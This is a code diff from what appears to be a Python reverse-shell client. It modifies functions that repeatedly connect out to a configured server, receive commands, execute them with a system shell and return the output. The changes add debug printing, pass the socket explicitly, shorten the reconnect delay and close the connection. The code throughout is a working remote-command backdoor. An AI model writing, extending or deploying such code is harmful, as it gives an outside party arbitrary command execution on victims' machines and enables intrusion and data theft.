@@ -8,21 +8,25 @@ import tools.utility as utility
 
 def shell():
     while True:
-        cmd = utility.reliable_recv()
+        cmd = utility.reliable_recv(client_socket)
+        print('shell() cmd : %s ' % cmd )
         if cmd == 'quit':
             break
         else:
             exec = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             res = exec.stdout.read() + exec.stderr.read()
             res = res.decode()
-            utility.reliable_send(res)
+            print('shell() res : %s ' % res )
+            utility.reliable_send(client_socket,res)
 
 def connection():
     while True:
-        time.sleep(42)
+        time.sleep(7)
         try :
             client_socket.connect((config.server_ip,config.port))
+            print('connection()')
             shell()
+            client_socket.close()
             break
         except:
             connection()
